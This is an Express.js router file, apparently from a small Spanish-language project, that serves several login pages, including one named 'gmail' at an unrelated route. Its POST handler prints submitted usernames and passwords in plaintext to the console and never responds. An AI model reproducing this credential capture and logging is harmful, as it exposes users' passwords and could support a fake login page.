var express = require('express');
const { default: nodemon } = require('nodemon');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('login/inicio');
});

router.get('/piola', function(req, res, next) {
  res.render('login/gmail');
});

router.get('/admin', function(req, res, next) {
  res.render('login/admin');
});


router.get('/repart', function(req, res, next) {
  res.render('login/repartidor');
})

router.post('/', (req, res) => {
  const nombre = req.body.username;
  const contraseña = req.body.password;
  console.log(`Nombre: ${nombre}, Correo: ${contraseña}`);
});




module.exports = router;

 